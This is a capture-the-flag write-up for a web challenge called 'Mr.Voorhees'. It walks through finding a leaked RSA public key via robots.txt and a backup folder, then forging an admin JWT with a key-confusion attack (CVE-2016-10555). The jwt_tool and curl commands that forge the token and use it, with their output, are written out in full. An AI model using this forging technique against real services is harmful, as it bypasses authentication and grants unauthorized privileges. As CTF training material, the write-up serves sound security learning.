#  Mr.Voorhees 
* Category: Web
* 200 Points
* Solved by the JCTF Team

## Description
> In reality, there's no such thing as bad luck.
> 
>  Friday is just a day like any other day.
> 
> Also, there's no such thing as bad algorithm.
> 
> The one I used should be secure enough.
> 
> Right?

## Solution

We enter the attached website and are greeted with a picture of [Mr. Voorhees](https://en.wikipedia.org/wiki/Jason_Voorhees) (a.k.a. **Jason** Voorhees), and a banner stating:

> You are not logged in as Admin
> 
> Come back with higher privileges

The website has no login system, so how does it know if we're admins? Let's check if there's a cookie:

```console
root@kali:/media/sf_CTFs/appsec/Mr.Voorhees# curl -s -I https://mr-voorhees.appsecil.ctf.today/ | grep cookie
set-cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6Ikphc29uIiwiaWF0IjoxNjAzNzM4MTIwfQ.To_hskfiK0mZ0lGDQhi_rFhpUzazdv5OfMjeKE6eqj2k0N-QNoueR4jqvGdGvt6Kei42XqDZo1iTwxKDq8ikvw; Path=/
```

This looks like a JWT token:

```
root@kali:/media/sf_CTFs/appsec/Mr.Voorhees# python3 ~/utils/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6Ikphc29uIiwiaWF0IjoxNjAzNzM4MTIwfQ.To_hskfiK0mZ0lGDQhi_rFhpUzazdv5OfMjeKE6eqj2k0N-QNoueR4jqvGdGvt6Kei42XqDZo1iTwxKDq8ikvw

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
  Version 2.0                 \______|             @ticarpi

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "RS256"

Token payload values:
[+] username = "Jason"
[+] iat = 1603738120    ==> TIMESTAMP = 2020-10-26 20:48:40 (UTC)
```

It has a username of "Jason", and we probably want to replace that with "Admin". However, the token is signed with "RS256" (RSA Signature with SHA-256), and we don't have the key. 

This is a web challenge, so it's always helpful to look around for the usual things. Let's check `robots.txt`:

```console
root@kali:/media/sf_CTFs/appsec/Mr.Voorhees# curl -s https://mr-voorhees.appsecil.ctf.today/robots.txt
User-Agent: Googlebot
Disallow: /backup/
```

What's this backup folder and why is the webmaster trying to hide it from robots?
```console
root@kali:/media/sf_CTFs/appsec/Mr.Voorhees# curl -s https://mr-voorhees.appsecil.ctf.today/backup/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Directory listing for /backup/</title>
</head>
<body>
<h1>Directory listing for /backup/</h1>
<hr>
<ul>
    <li><a href="public.pem">public.pem</a></li>
</ul>
<hr>
</body>
</html>
```

Backed up, there's a linked to a public key.

Let's get it:
```console
root@kali:/media/sf_CTFs/appsec/Mr.Voorhees# wget https://mr-voorhees.appsecil.ctf.today/backup/public.pem
--2020-10-26 20:56:40--  https://mr-voorhees.appsecil.ctf.today/backup/public.pem
Resolving mr-voorhees.appsecil.ctf.today (mr-voorhees.appsecil.ctf.today)... 18.134.59.71
Connecting to mr-voorhees.appsecil.ctf.today (mr-voorhees.appsecil.ctf.today)|18.134.59.71|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 177 [application/x-x509-ca-cert]
Saving to: ‘public.pem’

public.pem                                          100%[==================================================================================================================>]     177  --.-KB/s    in 0s

2020-10-26 20:56:41 (120 MB/s) - ‘public.pem’ saved [177/177]
root@kali:/media/sf_CTFs/appsec/Mr.Voorhees# openssl rsa -pubin -in public.pem  -text
RSA Public-Key: (511 bit)
Modulus:
    66:e1:f0:a4:f7:93:26:e3:bc:c0:c5:61:2a:15:a9:
    b4:76:f8:d8:1c:18:1f:9d:f7:f8:e0:75:27:80:be:
    2a:fd:21:e9:fc:cb:95:a1:d3:f6:78:b4:d6:5e:6f:
    88:9f:40:9a:7d:d3:a5:ec:65:dc:65:ea:76:e0:dd:
    cc:55:3c:e7
Exponent: 65537 (0x10001)
writing RSA key
-----BEGIN PUBLIC KEY-----
MFswDQYJKoZIhvcNAQEBBQADSgAwRwJAZuHwpPeTJuO8wMVhKhWptHb42BwYH533
+OB1J4C+Kv0h6fzLlaHT9ni01l5viJ9Amn3Tpexl3GXqduDdzFU85wIDAQAB
-----END PUBLIC KEY-----
```

There's a known attack against JWT involving public keys: [CVE-2016-10555](https://www.cvedetails.com/cve/CVE-2016-10555/) - The RS/HS256 public key mismatch vulnerability.

> Since "algorithm" isn't enforced in jwt.decode() in jwt-simple 0.3.0 and earlier, a malicious user could choose what algorithm is sent sent to the server. If the server is expecting RSA but is sent HMAC-SHA with RSA's public key, the server will think the public key is actually an HMAC private key. This could be used to forge any data an attacker wants.

Using [jwt_tool](https://github.com/ticarpi/jwt_tool), we can execute it:
```console
root@kali:/media/sf_CTFs/appsec/Mr.Voorhees# python3 ~/utils/jwt_tool/jwt_tool.py -X k -pk public.pem eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6Ikphc29uIiwiaWF0IjoxNjAzNzM4MTIwfQ.To_hskfiK0mZ0lGDQ
hi_rFhpUzazdv5OfMjeKE6eqj2k0N-QNoueR4jqvGdGvt6Kei42XqDZo1iTwxKDq8ikvw  -I -pc username -pv Admin

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
  Version 2.0                 \______|             @ticarpi

Original JWT:

File loaded: public.pem
jwttool_1d9281df0772d80501021d9ea8c2686e - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkFkbWluIiwiaWF0IjoxNjAzNzM4MTIwfQ.z3ICauMOuuIxO_0WJtBPfdqevXBXqihSIAMSL6w2Ej4
```

What we're doing here is replacing the username with "Admin", changing the algorithm to HS256 (HMAC-SHA256) and resigning with the public key we got.

Let's use the new token to access the website:

```console
root@kali:/media/sf_CTFs/appsec/Mr.Voorhees# curl -s https://mr-voorhees.appsecil.ctf.today/ -H "Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkFkbWluIiwiaWF0IjoxNjAzNzM4MTIwfQ.z3ICauMOuuIxO_0WJtBPfdqevXBXqihSIAMSL6w2Ej4" | grep AppSec
AppSec-IL{100k_wh47_y0u_d1d_70_h1m}
```

We got the flag.